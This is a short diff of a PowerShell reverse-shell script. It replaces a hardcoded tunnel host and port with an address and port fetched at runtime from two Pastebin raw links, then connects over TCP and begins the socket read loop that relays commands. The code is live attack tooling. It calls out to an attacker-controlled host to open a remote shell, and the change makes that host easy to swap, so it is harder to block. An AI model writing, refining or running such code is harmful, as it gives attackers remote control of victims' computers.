@@ -1,6 +1,10 @@
 While($true) {
-    Try {
-        Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('supplies-full.gl.at.ply.gg',44253));
+    Try {       
+        $pastebinScriptUrl = 'https://pastebin.com/raw/b9j9rc8N'
+        $pastebinScriptUrl2 = 'https://pastebin.com/raw/5nGTwEY8'
+        $i = (New-Object System.Net.WebClient).DownloadString($pastebinScriptUrl)
+        $p = (New-Object System.Net.WebClient).DownloadString($pastebinScriptUrl2)
+        Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient($i, $p))
         Set-Variable -Name stream -Value ($client.GetStream());
         [byte[]]$bytes = 0..65535|%{0};
         while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0) {
